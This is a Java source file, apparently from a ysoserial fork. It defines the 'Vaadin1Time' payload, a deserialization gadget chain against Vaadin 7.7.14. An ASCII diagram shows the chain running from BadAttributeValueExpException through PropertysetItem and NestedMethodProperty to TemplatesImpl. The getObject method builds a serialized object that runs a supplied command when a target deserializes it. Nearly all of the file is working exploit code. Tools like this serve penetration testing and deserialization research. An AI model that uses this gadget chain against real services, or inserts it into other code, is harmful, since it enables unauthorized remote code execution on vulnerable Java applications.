package ysoserial.payloads;

import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;

@Dependencies ( { "com.vaadin:vaadin-server:7.7.14", "com.vaadin:vaadin-shared:7.7.14" })
@PayloadTest ( precondition = "isApplicableJavaVersion")
@Authors({ Authors.KULLRICH })
public class Vaadin1Time implements ObjectPayload<Object>
{
//  +-------------------------------------------------+
//  |                                                 |
//  |  BadAttributeValueExpException                  |
//  |                                                 |
//  |  val ==>  PropertysetItem                       |
//  |                                                 |
//  |  readObject() ==> val.toString()                |
//  |          +                                      |
//  +----------|--------------------------------------+
//             |
//             |
//             |
//        +----|-----------------------------------------+
//        |    v                                         |
//        |  PropertysetItem                             |
//        |                                              |
//        |  toString () => getPropertyId().getValue ()  |
//        |                                       +      |
//        +---------------------------------------|------+
//                                                |
//                  +-----------------------------+
//                  |
//            +-----|----------------------------------------------+
//            |     v                                              |
//            |  NestedMethodProperty                              |
//            |                                                    |
//            |  getValue() => java.lang.reflect.Method.invoke ()  |
//            |                                           |        |
//            +-------------------------------------------|--------+
//                                                        |
//                    +-----------------------------------+
//                    |
//                +---|--------------------------------------------+
//                |   v                                            |
//                |  TemplatesImpl.getOutputProperties()           |
//                |                                                |
//                +------------------------------------------------+

    @Override
    public Object getObject (String command) throws Exception
    {
        Object templ = Gadgets.createTemplatesImplTime(command);
        PropertysetItem pItem = new PropertysetItem ();

        NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object> (templ, "outputProperties");
        pItem.addItemProperty ("outputProperties", nmprop);

        BadAttributeValueExpException b = new BadAttributeValueExpException ("");
        Reflections.setFieldValue (b, "val", pItem);

        return b;
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Vaadin1Time.class, args);
    }

}
